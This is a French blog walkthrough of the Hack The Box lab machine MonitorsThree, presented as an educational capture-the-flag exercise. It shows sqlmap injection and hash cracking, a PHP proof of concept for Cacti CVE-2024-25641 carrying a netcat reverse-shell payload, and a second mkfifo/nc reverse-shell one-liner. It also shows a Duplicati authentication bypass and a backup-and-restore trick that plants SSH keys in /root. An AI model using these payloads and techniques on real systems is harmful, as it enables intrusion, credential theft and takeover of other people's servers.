<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><style>:root{--accent-color:#FF4D4D;--font-size:17.5px}</style><title>HTB: MonitorsThree</title>
<meta name=description content="Platforme: Hack The Box Lien: MonitorsThree Niveau: Moyen OS: Linux Lire cet article en anglais
MonitorsThree héberge un site web sur le port 80 et une instance …"><meta name=keywords content="HackTheBox"><meta property="og:url" content="https://scorpiosec.com/fr/posts/htb-monitorsthree/"><meta property="og:type" content="website"><meta property="og:title" content="HTB: MonitorsThree"><meta property="og:description" content="Platforme: Hack The Box Lien: MonitorsThree Niveau: Moyen OS: Linux Lire cet article en anglais
MonitorsThree héberge un site web sur le port 80 et une instance …"><meta property="og:image" content="https://scorpiosec.com/images/HTB-MonitorsThree/MonitorsThree.png"><meta property="og:image:secure_url" content="https://scorpiosec.com/images/HTB-MonitorsThree/MonitorsThree.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:title content="HTB: MonitorsThree"><meta name=twitter:description content="Platforme: Hack The Box Lien: MonitorsThree Niveau: Moyen OS: Linux Lire cet article en anglais
MonitorsThree héberge un site web sur le port 80 et une instance …"><meta property="twitter:domain" content="https://scorpiosec.com/fr/posts/htb-monitorsthree/"><meta property="twitter:url" content="https://scorpiosec.com/fr/posts/htb-monitorsthree/"><meta name=twitter:image content="https://scorpiosec.com/images/HTB-MonitorsThree/MonitorsThree.png"><link rel=canonical href=https://scorpiosec.com/fr/posts/htb-monitorsthree/><link rel=stylesheet type=text/css href=/css/normalize.min.css media=print><link rel=stylesheet type=text/css href=/css/main.min.css><link id=dark-theme rel=stylesheet href=/css/dark.min.css><script src=/js/bundle.min.dbdc9b4541e086f12258f5155a48310ed9f06d931aacfe9b7c85f8699b1f5cb2.js integrity="sha256-29ybRUHghvEiWPUVWkgxDtnwbZMarP6bfIX4aZsfXLI="></script></head><body><script>setThemeByUserPref()</script><header class=header><nav class=header-nav><div class=avatar><a href=https://scorpiosec.com/><img src=/redscorpio.jpg alt=avatar></a></div><div class=nav-title><a class=nav-brand href=https://scorpiosec.com/>Scorpiosec</a></div><div class=nav-links><div class=nav-link><a href=https://scorpiosec.com/fr/posts/ aria-label=posts><span data-feather=book></span> Postes</a></div><div class=nav-link><a href=https://scorpiosec.com/fr/projects/ aria-label=projects><span data-feather=code></span> Projets</a></div><div class=nav-link><a href=https://scorpiosec.com/fr/tags/ aria-label=tags><span data-feather=tag></span> Tags</a></div><div class=nav-link><a href=https://scorpiosec.com/fr/categories/ aria-label=categories><span data-feather=folder></span> Catégories</a></div><div class=nav-link><a href=https://scorpiosec.com/ aria-label></a></div><div class="nav-link language-switcher"><a href=/posts/htb-monitorsthree/>English</a></div><span class=nav-icons-divider></span><div class="nav-link dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a aria-hidden=true role=switch><span class=theme-toggle-icon data-feather=moon></span></a></div><div class=nav-link id=hamburger-menu-toggle><span class="sr-only hamburger-menu-toggle-screen-reader-target">menu</span>
<a aria-checked=false aria-labelledby=hamburger-menu-toggle id=hamburger-menu-toggle-target role=switch><span data-feather=menu></span></a></div><ul class="nav-hamburger-list visibility-hidden"><li class=nav-item><a href=https://scorpiosec.com/fr/posts/><span data-feather=book></span> Postes</a></li><li class=nav-item><a href=https://scorpiosec.com/fr/projects/><span data-feather=code></span> Projets</a></li><li class=nav-item><a href=https://scorpiosec.com/fr/tags/><span data-feather=tag></span> Tags</a></li><li class=nav-item><a href=https://scorpiosec.com/fr/categories/><span data-feather=folder></span> Catégories</a></li><li class=nav-item><a href=https://scorpiosec.com/></a></li><li class="nav-item dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a role=switch><span class=theme-toggle-icon data-feather=moon></span></a></li></ul></div></nav></header><main id=content><div class="post container"><div class=post-header-section><h1>HTB: MonitorsThree</h1><small role=doc-subtitle></small><p class=post-date>7 min read |
<span class=post-date>17 Janvier 2025</span></p><ul class=post-tags><li class=post-tag><a href=https://scorpiosec.com/fr/tags/hackthebox>HackTheBox</a></li></ul></div><div class=post-content><ul><li>Platforme: Hack The Box</li><li>Lien: <a href=https://app.hackthebox.com/machines/MonitorsThree>MonitorsThree</a></li><li>Niveau: Moyen</li><li>OS: Linux</li></ul><hr><p><a href=https://scorpiosec.com/posts/htb-monitorsthree/>Lire cet article en anglais</a></p><p>MonitorsThree héberge un site web sur le port 80 et une instance Cacti sur un sous-domaine. La fonction <code>Forgot Password?</code> sur le site principal est vulnérable à l&rsquo;injection SQL, que nous exploitons pour récupérer le mot de passe de l&rsquo;utilisateur admin. En utilisant ces informations d&rsquo;identification, nous accédons au tableau de bord de Cacti et utilisons le <code>CVE-2024-25641</code> pour obtenir un accès initial au système. Une exploration plus poussée révèle d&rsquo;autres hachages de mots de passe, ce qui nous permet de pivoter vers un autre utilisateur via SSH. À travers l&rsquo;énumération du système, nous découvrons une instance de Duplicati accessible en interne. Avec un tunnel, nous sommes capables d&rsquo;y accéder et grâce à un exploit de contournement d&rsquo;authentification nous nous connectons à Duplicati et récupérons le drapeau root.</p><p>Adresse IP cible - <code>10.10.11.30</code></p><h2 id=balayage>Balayage</h2><pre tabindex=0><code>nmap -sC -sV -oA nmap/MonitorsThree 10.10.11.30
</code></pre><p><strong>Résultats</strong></p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>Starting Nmap 7.94SVN <span style=color:#56b6c2>(</span> https://nmap.org <span style=color:#56b6c2>)</span> at 2025-01-14 18:00 CST
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#c678dd>for</span> 10.10.11.30
</span></span><span style=display:flex><span>Host is up <span style=color:#56b6c2>(</span>0.060s latency<span style=color:#56b6c2>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#d19a66>997</span> closed tcp ports <span style=color:#56b6c2>(</span>conn-refused<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>PORT     STATE    SERVICE VERSION
</span></span><span style=display:flex><span>22/tcp   open     ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 <span style=color:#56b6c2>(</span>Ubuntu Linux; protocol 2.0<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>| ssh-hostkey: 
</span></span><span style=display:flex><span>|   <span style=color:#d19a66>256</span> 86:f8:7d:6f:42:91:bb:89:72:91:af:72:f3:01:ff:5b <span style=color:#56b6c2>(</span>ECDSA<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|_  <span style=color:#d19a66>256</span> 50:f9:ed:8e:73:64:9e:aa:f6:08:95:14:f0:a6:0d:57 <span style=color:#56b6c2>(</span>ED25519<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>80/tcp   open     http    nginx 1.18.0 <span style=color:#56b6c2>(</span>Ubuntu<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|_http-server-header: nginx/1.18.0 <span style=color:#56b6c2>(</span>Ubuntu<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|_http-title: Did not follow redirect to http://monitorsthree.htb/
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>8084/tcp filtered websnp
</span></span><span style=display:flex><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span>Nmap <span style=color:#c678dd>done</span>: <span style=color:#d19a66>1</span> IP address <span style=color:#56b6c2>(</span><span style=color:#d19a66>1</span> host up<span style=color:#56b6c2>)</span> scanned in 13.83 seconds
</span></span></code></pre></div><p>Nous avons trois ports ouverts :</p><ul><li>22 pour SSH</li><li>80 exécute HTTP, avec une redirection vers <code>monitorsthree.htb</code>.</li></ul><h2 id=enumération>Enumération</h2><p>En allant sur <code>http://monitorsthree.htb/</code>, nous trouvons un site web offrant des services de solutions de réseau.</p><p><img src=/images/HTB-MonitorsThree/monitorsthree_website.png alt="MonitorsThree website"></p><p>Il existe une page de connexion à l&rsquo;adresse <code>http://monitorsthree.htb/login.php</code>.</p><p><img src=/images/HTB-MonitorsThree/login_page_monitorsthree.png alt="MonitorsThree login"></p><p>Une attaque par force brute sur les répertoires révèle la présence de <code>/admin</code> mais nous ne pouvons pas y accéder pour le moment.</p><pre tabindex=0><code>gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://monitorsthree.htb/
</code></pre><p><img src=/images/HTB-MonitorsThree/gobuster_cmd.png alt="directory brute forcing"></p><p><img src=/images/HTB-MonitorsThree/monitorsthree_admin.png alt="admin page monitorsthree"></p><p>Nous trouvons également un sous-domaine (<code>cacti</code>) grâce à l&rsquo;énumération des sous-domaines.</p><pre tabindex=0><code>ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --fc 404 -t 100 -u http://monitorsthree.htb -H &#34;Host: FUZZ.monitorsthree.htb&#34; -ic -fs 13560
</code></pre><p><img src=/images/HTB-MonitorsThree/monitorsthree_subdomain.png alt="cacti subdomain"></p><p>A <code>http://cacti.monitorsthree.htb/cacti/</code> nous trouvons une autre page de connexion. Nous observons une version pour le logiciel, <code>1.2.26</code>.</p><p><img src=/images/HTB-MonitorsThree/cacti_login_page.png alt="cacti login page"></p><p>Nous arrivons à <code>http://monitorsthree.htb/forgot_password.php</code> après avoir sélectionné <code>Forgot password?</code> à <code>http://monitorsthree.htb/login.php</code>.</p><p><img src=/images/HTB-MonitorsThree/forgot_pwd.png alt="forgot password page"></p><p>Nous essayons d&rsquo;exploiter cette fonctionnalité par le biais d&rsquo;une injection SQL. Nous capturons la requête et l&rsquo;utilisons avec SQLmap.</p><p><img src=/images/HTB-MonitorsThree/reset_pwd_request.png alt="reset password request"></p><p>Nous commençons par cibler le paramètre <code>username</code> et SQLmap est capable d&rsquo;identifier l&rsquo;injection.</p><pre tabindex=0><code>sqlmap -r reset.txt --level 5 --risk 3 -p username --batch --threads=10 --batch
</code></pre><p><img src=/images/HTB-MonitorsThree/sqlmap1.png alt="SQL injection on username parameter"></p><p>Nous énumérons la cible et trouvons deux bases de données.</p><pre tabindex=0><code>sqlmap -r reset.txt --level 5 --risk 3 -p username --batch --threads=10 --batch --dbs
</code></pre><p><img src=/images/HTB-MonitorsThree/dbs_found.png alt="databases found"></p><p>Nous pouvons maintenant énumérer les tables de la base de données <code>monitorsthree_db</code> puisque <code>information_schema</code> est une base de données système par défaut dans MySQL.</p><pre tabindex=0><code>sqlmap -r reset.txt --level 5 --risk 3 -p username --batch --threads=10 --batch -D monitorsthree_db --tables
</code></pre><p><img src=/images/HTB-MonitorsThree/db_tables.png alt="tables found"></p><p>La table <code>users</code> est la plus prometteuse.</p><pre tabindex=0><code>sqlmap -r reset.txt --level 5 --risk 3 -p username --batch --threads=10 -D monitorsthree_db -T users --dbms=mysql --technique=T --dump
</code></pre><p><img src=/images/HTB-MonitorsThree/SQLmap_hashes.png alt="SQLmap hashes found"></p><p>Nous récupérons le mot de passe de <code>admin</code> avec hashcat.</p><pre tabindex=0><code>hashcat -m 0 -a 0 admin_hash.txt /usr/share/wordlists/rockyou.txt
</code></pre><p><img src=/images/HTB-MonitorsThree/admin_pwd.png alt="admin password"></p><p>Avec les identifiants <code>admin:greencacti2001</code> nous nous connectons à Cacti et accédons au tableau de bord.</p><blockquote><p>Les mêmes identifiants fonctionnent également sur la page de connexion à <code>http://monitorsthree.htb/login.php</code>.</p></blockquote><p><img src=/images/HTB-MonitorsThree/cacti_dashboard.png alt="cacti dashboard"></p><h2 id=accès-initial>Accès initial</h2><h3 id=exploitation-manuelle>Exploitation manuelle</h3><p>La recherche de vulnérabilités pour la version 1.2.26 de <code>Cacti</code> conduit au <code>CVE-2024-25641</code> permettant un RCE en utilisant un paquet malveillant. Le PoC est disponible <a href=https://github.com/cacti/cacti/security/advisories/GHSA-7cmj-g5qc-pj88>ici</a>.</p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-PHP data-lang=PHP><span style=display:flex><span><span style=color:#56b6c2>&lt;?</span><span style=color:#e06c75>php</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e06c75>$xmldata</span> <span style=color:#56b6c2>=</span> <span style=color:#98c379>&#34;&lt;xml&gt;
</span></span></span><span style=display:flex><span><span style=color:#98c379>   &lt;files&gt;
</span></span></span><span style=display:flex><span><span style=color:#98c379>       &lt;file&gt;
</span></span></span><span style=display:flex><span><span style=color:#98c379>           &lt;name&gt;resource/test.php&lt;/name&gt;
</span></span></span><span style=display:flex><span><span style=color:#98c379>           &lt;data&gt;%s&lt;/data&gt;
</span></span></span><span style=display:flex><span><span style=color:#98c379>           &lt;filesignature&gt;%s&lt;/filesignature&gt;
</span></span></span><span style=display:flex><span><span style=color:#98c379>       &lt;/file&gt;
</span></span></span><span style=display:flex><span><span style=color:#98c379>   &lt;/files&gt;
</span></span></span><span style=display:flex><span><span style=color:#98c379>   &lt;publickey&gt;%s&lt;/publickey&gt;
</span></span></span><span style=display:flex><span><span style=color:#98c379>   &lt;signature&gt;&lt;/signature&gt;
</span></span></span><span style=display:flex><span><span style=color:#98c379>&lt;/xml&gt;&#34;</span>;
</span></span><span style=display:flex><span><span style=color:#e06c75>$filedata</span> <span style=color:#56b6c2>=</span> <span style=color:#98c379>&#34;&lt;?php shell_exec(&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2&gt;&amp;1|nc {IP} {PORT} &gt;/tmp/f&#39;); ?&gt;&#34;</span>;
</span></span><span style=display:flex><span><span style=color:#e06c75>$keypair</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>openssl_pkey_new</span>(); 
</span></span><span style=display:flex><span><span style=color:#e06c75>$public_key</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>openssl_pkey_get_details</span>(<span style=color:#e06c75>$keypair</span>)[<span style=color:#98c379>&#34;key&#34;</span>]; 
</span></span><span style=display:flex><span><span style=color:#e06c75>openssl_sign</span>(<span style=color:#e06c75>$filedata</span>, <span style=color:#e06c75>$filesignature</span>, <span style=color:#e06c75>$keypair</span>, <span style=color:#e06c75>OPENSSL_ALGO_SHA256</span>);
</span></span><span style=display:flex><span><span style=color:#e06c75>$data</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>sprintf</span>(<span style=color:#e06c75>$xmldata</span>, <span style=color:#e06c75>base64_encode</span>(<span style=color:#e06c75>$filedata</span>), <span style=color:#e06c75>base64_encode</span>(<span style=color:#e06c75>$filesignature</span>), <span style=color:#e06c75>base64_encode</span>(<span style=color:#e06c75>$public_key</span>));
</span></span><span style=display:flex><span><span style=color:#e06c75>openssl_sign</span>(<span style=color:#e06c75>$data</span>, <span style=color:#e06c75>$signature</span>, <span style=color:#e06c75>$keypair</span>, <span style=color:#e06c75>OPENSSL_ALGO_SHA256</span>);
</span></span><span style=display:flex><span><span style=color:#e06c75>file_put_contents</span>(<span style=color:#98c379>&#34;test.xml&#34;</span>, <span style=color:#e06c75>str_replace</span>(<span style=color:#98c379>&#34;&lt;signature&gt;&lt;/signature&gt;&#34;</span>, <span style=color:#98c379>&#34;&lt;signature&gt;&#34;</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>base64_encode</span>(<span style=color:#e06c75>$signature</span>)<span style=color:#56b6c2>.</span><span style=color:#98c379>&#34;&lt;/signature&gt;&#34;</span>, <span style=color:#e06c75>$data</span>));
</span></span><span style=display:flex><span><span style=color:#e06c75>system</span>(<span style=color:#98c379>&#34;cat test.xml | gzip -9 &gt; test.xml.gz; rm test.xml&#34;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#7f848e>?&gt;</span>
</span></span></code></pre></div><p>Après exécution du script, nous obtenons <code>test.xml.gz</code>. Dans Cacti, nous allons dans <code>Import/Export</code> > <code>Import Packages</code>.</p><p>Nous téléchargeons le paquet malveillant et l&rsquo;importons.</p><p><img src=/images/HTB-MonitorsThree/cacti_pkg_import.png alt="cacti package import"></p><p>Nous exécutons notre payload en allant sur <code>http://cacti.monitorsthree.htb/cacti/resource/test.php</code> et recevons une connexion sur notre listener.</p><p><img src=/images/HTB-MonitorsThree/foothold_manual.png alt="manual exploit foothold"></p><h3 id=exploitation-avec-metasploit>Exploitation avec Metasploit</h3><p>Dans Metasploit, nous pouvons utiliser le <code>multi/http/cacti_package_import_rce</code> pour obtenir un shell en tant que <code>www-data</code>.</p><pre tabindex=0><code>set password greencacti2001
set rhosts cacti.monitorsthree.htb
set lhost tun0
set lport PORT_NUMBER
</code></pre><p><img src=/images/HTB-MonitorsThree/foothold_cacti.png alt="Metasploit exploit foothold"></p><p>Le shell n&rsquo;étant pas interactif, nous passons à un shell plus performant.</p><p><img src=/images/HTB-MonitorsThree/bad_shell.png alt="bad shell"></p><p>En utilisant une commande de shell inversé (<code>nc mkfifo</code>) disponible sur <a href=https://www.revshells.com/>revshells</a>, nous obtenons un shell que nous améliorons.</p><pre tabindex=0><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc YOUR_IP PORT_NUMBER &gt;/tmp/f
</code></pre><p><img src=/images/HTB-MonitorsThree/better_shell.png alt="better shell"></p><p>Une simple recherche sur Google nous apprend que le fichier de configuration de Cacti est situé dans <code>/var/www/html/cacti/include/config.php</code>.</p><p><img src=/images/HTB-MonitorsThree/cacti_config_file_location.png alt="Cacti configuration file location"></p><p>Ce fichier contient des informations d&rsquo;identification pour la base de données.</p><p><img src=/images/HTB-MonitorsThree/db_creds.png alt="database credentials"></p><p>Nous nous connectons à la base de données.</p><pre tabindex=0><code>mysql -u cactiuser -p cactiuser
</code></pre><p>Après avoir listé les tables, nous trouvons des hachages de mots de passe dans la table <code>user_auth</code>. Il s&rsquo;agit de hachages Blowfish.</p><pre tabindex=0><code>show tables;

select * from user_auth;
</code></pre><p><img src=/images/HTB-MonitorsThree/pwd_hashes.png alt="password hashes"></p><p>Avec hashcat, nous récupérons le mot de passe de l&rsquo;utilisateur marcus, <code>12345678910</code>.</p><pre tabindex=0><code>hashcat -m 3200 -a 0 marcus_hash.txt /usr/share/wordlists/rockyou.txt
</code></pre><p><img src=/images/HTB-MonitorsThree/marcus_pwd.png alt="marcus password"></p><h2 id=shell-en-tant-que-marcus>Shell en tant que marcus</h2><p>Nous passons à l&rsquo;utilisateur <code>marcus</code> et trouvons le drapeau utilisateur dans son répertoire personnel.</p><p><img src=/images/HTB-MonitorsThree/user_flag.png alt="user flag"></p><p>Les clés SSH pour <code>marcus</code> sont dans <code>/.ssh/</code>, nous envoyons le fichier <code>id_rsa</code> à notre machine locale afin de nous connecter via SSH.</p><p><img src=/images/HTB-MonitorsThree/ssh_key_marcus.png alt="marcus ssh key"></p><pre tabindex=0><code>ssh -i id_rsa marcus@monitorsthree.htb
</code></pre><p><img src=/images/HTB-MonitorsThree/marcus_ssh_login.png alt="marcus ssh login"></p><p>Après avoir exécuté linpeas, nous trouvons quelques connexions internes. Nous allons vérifier les ports <code>8200</code> et <code>37181</code>.</p><p><img src=/images/HTB-MonitorsThree/active_ports.png alt="active ports"></p><p>Nous devons faire du tunneling pour accéder à ces ports, j&rsquo;ai utilisé <a href=https://github.com/nicocha30/ligolo-ng/releases>ligolo-ng</a> pour le faire.</p><p>Seul le port <code>8200</code> est accessible, où nous trouvons une page de connexion <a href=https://duplicati.com/>Duplicati</a>.</p><blockquote><p>Duplicati est un logiciel de sauvegarde open-source conçu pour stocker en toute sécurité des sauvegardes de données.</p></blockquote><p><img src=/images/HTB-MonitorsThree/duplicati_login.png alt="Duplicati login page"></p><p>En recherchant les vulnerabilités de Duplicati, nous trouvons <a href=https://medium.com/@STarXT/duplicati-bypassing-login-authentication-with-server-passphrase-024d6991e9ee>ici</a> un article sur Medium démontrant un contournement de l&rsquo;authentification et une page Github détaillant les étapes pour reproduire l&rsquo;exploit <a href=https://github.com/duplicati/duplicati/issues/5197>ici</a>.</p><p><img src=/images/HTB-MonitorsThree/exploit_steps.png alt="Exploit steps"></p><p>En inspectant le résultat de linpeas, nous constatons qu&rsquo;il y a un répertoire Duplicati dans <code>/opt</code>.</p><p><img src=/images/HTB-MonitorsThree/duplicati_opt_directory.png alt="Duplicati opt directory"></p><p>Nous trouvons <code>Duplicati-server.sqlite</code> dans <code>/opt/duplicati/config</code>.</p><p><img src=/images/HTB-MonitorsThree/duplicati_db_file.png alt="Duplicati database file"></p><p>Avec <code>scp</code>, nous téléchargeons le fichier de la base de données, qui contient la phrase d&rsquo;authentification du serveur.</p><pre tabindex=0><code>scp -i id_rsa marcus@monitorsthree.htb:/opt/duplicati/config/Duplicati-server.sqlite /home/kscorpio/Machines/HTB/MonitorsThree
</code></pre><p><img src=/images/HTB-MonitorsThree/server-passphrase.png alt="Duplicati server passphrase"></p><p>Ensuite, nous convertissons la phrase d&rsquo;authentification du serveur en HEX.</p><pre tabindex=0><code>echo &#34;Wb6e855L3sN9LTaCuwPXuautswTIQbekmMAr7BrK2Ho=&#34; | base64 -d | xxd -p
</code></pre><p><img src=/images/HTB-MonitorsThree/HEX_conversion.png alt="server passphrase HEX conversion"></p><pre tabindex=0><code>59be9ef39e4bdec37d2d3682bb03d7b9abadb304c841b7a498c02bec1acad87a
</code></pre><p>Avec Burp, nous interceptons une requête de connexion et notons la valeur de <code>session-nonce</code>. Cette valeur sera différente pour chaque requête, et nous devons la décoder (Ctrl + U).</p><p><img src=/images/HTB-MonitorsThree/duplicati_login_request.png alt="Duplicati login request"></p><p>Dans le navigateur, nous ouvrons la console et utilisons la commande suivante</p><pre tabindex=0><code>var noncepwd = CryptoJS.SHA256(CryptoJS.enc.Hex.parse(CryptoJS.enc.Base64.parse(&#39;url_decoded_nonce_value&#39;) + &#39;salted_hex_passphrase&#39;)).toString(CryptoJS.enc.Base64);
</code></pre><p>Ensuite, nous exécutons <code>noncepwd</code> pour obtenir la nouvelle valeur du mot de passe.</p><pre tabindex=0><code>noncepwd
</code></pre><p><img src=/images/HTB-MonitorsThree/duplicati_auth_bypass.png alt="Duplicati auth bypass"></p><p>Dans Burp, nous remplaçons la valeur de <code>password</code> par la valeur de <code>noncepwd</code> et l&rsquo;encodons avec Ctrl + U.</p><p><img src=/images/HTB-MonitorsThree/new_password.png alt="New password"></p><p>Après avoir transmis la demande, nous sommes maintenant connectés à Duplicati.</p><p><img src=/images/HTB-MonitorsThree/duplicati_dashboard.png alt="Duplicati dashboard"></p><h2 id=elévation-de-privilèges>Elévation de Privilèges</h2><h3 id=récupération-du-drapeau-root>Récupération du drapeau root</h3><p>Allez dans <code>Add Backup</code> > <code>Configure a new backup</code>. Pour <code>General backup settings</code>, choisissez un nom et générez une phrase d&rsquo;authentification (passphrase). Vous pouvez aussi changer <code>Encryption</code> en <code>No encryption</code> si vous le souhaitez.</p><p><img src=/images/HTB-MonitorsThree/backup1.png alt="Backup command 1"></p><p>Pour la destination de la sauvegarde, nous entrons <code>/source/tmp</code>.</p><p><img src=/images/HTB-MonitorsThree/backup2.png alt="Backup command 2"></p><p>Ajoutez le chemin <code>/source/root/root.txt</code> dans la section <code>Source Data</code>.</p><p><img src=/images/HTB-MonitorsThree/backup3.png alt="Backup command 3"></p><p>Dans la section <code>Schedule</code> décochez les sauvegardes automatiques et enfin sauvegardez votre backup.</p><p>Dans la section <code>Home</code>, exécutez votre sauvegarde en cliquant sur le bouton <code>Run now</code>.</p><p><img src=/images/HTB-MonitorsThree/run_now_backup.png alt="Run backup now button"></p><p>Allez dans <code>Restore</code>, choisissez votre sauvegarde et sélectionnez les fichiers à restaurer.</p><p><img src=/images/HTB-MonitorsThree/files_to_restore.png alt="restore root flag"></p><p>Décider où restaurer les fichiers, nous devons choisir un répertoire auquel <code>marcus</code> peut accéder.</p><p><img src=/images/HTB-MonitorsThree/restore_location.png alt="restore root flag location"></p><p>Une fois la sauvegarde terminée, le drapeau root est désormais accessible.</p><p><img src=/images/HTB-MonitorsThree/root_flag.png alt="root flag"></p><h3 id=accès-au-compte-root>Accès au compte root</h3><p>Bien que nous ayons lu le drapeau root, nous n&rsquo;avons toujours pas accès au compte root.</p><p>En utilisant le même processus de sauvegarde, nous découvrons que le seul fichier dans <code>/root/.ssh</code> est <code>authorized_keys</code> et que ce fichier est vide.</p><p><img src=/images/HTB-MonitorsThree/root_ssh_directory.png alt="root SSH directory"></p><blockquote><p>Nous n&rsquo;avons pas les droits d&rsquo;écriture sur le fichier <code>authorized_keys</code> appartenant à root, autrement nous y aurions simplement ajouté la clé publique de Marcus.</p></blockquote><p><img src=/images/HTB-MonitorsThree/root_authorized_keys.png alt="root authorized_keys file"></p><p>Nous pouvons faire une sauvegarde de <code>/home/marcus/.ssh/authorized_keys</code> et la restaurer dans <code>/root/.ssh/</code> afin d&rsquo;être capable de se connecter en tant que root via SSH.</p><p>Pour la nouvelle sauvegarde, sélectionnez <code>/source/home/marcus/.ssh/</code> comme <code>Source Data</code>.</p><p><img src=/images/HTB-MonitorsThree/source_data_root.png alt="Source data for SSH backup"></p><p>Restaurez le fichier <code>authorized_keys</code>.</p><p><img src=/images/HTB-MonitorsThree/restore_file_root.png alt="authorized_keys file restore"></p><p>Entrez <code>/source/root/.ssh/</code> comme emplacement.</p><p><img src=/images/HTB-MonitorsThree/restore_file_root.png alt="authorized_keys file restore location"></p><p>Nous sommes maintenant capables de nous connecter en tant que root via SSH, et comme le montre l&rsquo;image ci-dessous, <code>authorized_keys</code> n&rsquo;est plus vide.</p><p><img src=/images/HTB-MonitorsThree/root_account.png alt="SSH root login"></p></div><div class=prev-next><div class=prev-post><p><a href=/fr/posts/htb-compiled/>&#8592;
Précédent:
HTB: Compiled</a></p><p class=prev-post-date>décembre 13, 2024</p></div><div class=next-post><p><a href=/fr/posts/thm-smol/>Suivant:
THM: Smol
&#8594;</a></p><p class=next-post-date>janvier 27, 2025</p></div></div><svg id="btt-button" class="arrow-logo" xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 384 512" onclick="scrollToTop()" title="Go to top"><path d="M177 159.7l136 136c9.4 9.4 9.4 24.6.0 33.9l-22.6 22.6c-9.4 9.4-24.6 9.4-33.9.0L160 255.9l-96.4 96.4c-9.4 9.4-24.6 9.4-33.9.0L7 329.7c-9.4-9.4-9.4-24.6.0-33.9l136-136c9.4-9.5 24.6-9.5 34-.1z"/></svg>
<script>let backToTopButton=document.getElementById("btt-button");window.onscroll=function(){scrollFunction()};function scrollFunction(){document.body.scrollTop>20||document.documentElement.scrollTop>20?backToTopButton.style.display="block":backToTopButton.style.display="none"}function scrollToTop(){window.scrollTo(0,0)}</script></div><aside class=post-toc><nav id=toc><nav id=TableOfContents><ul><li><ul><li><a href=#balayage>Balayage</a></li><li><a href=#enumération>Enumération</a></li><li><a href=#accès-initial>Accès initial</a><ul><li><a href=#exploitation-manuelle>Exploitation manuelle</a></li><li><a href=#exploitation-avec-metasploit>Exploitation avec Metasploit</a></li></ul></li><li><a href=#shell-en-tant-que-marcus>Shell en tant que marcus</a></li><li><a href=#elévation-de-privilèges>Elévation de Privilèges</a><ul><li><a href=#récupération-du-drapeau-root>Récupération du drapeau root</a></li><li><a href=#accès-au-compte-root>Accès au compte root</a></li></ul></li></ul></li></ul></nav></nav></aside></main><footer class=footer><span>&copy; 2025 K-Scorpio</span>
<span>Made with &#10084;&#65039; using <a target=_blank href=https://github.com/gokarna-theme/gokarna-hugo>Gokarna</a></span></footer></body></html>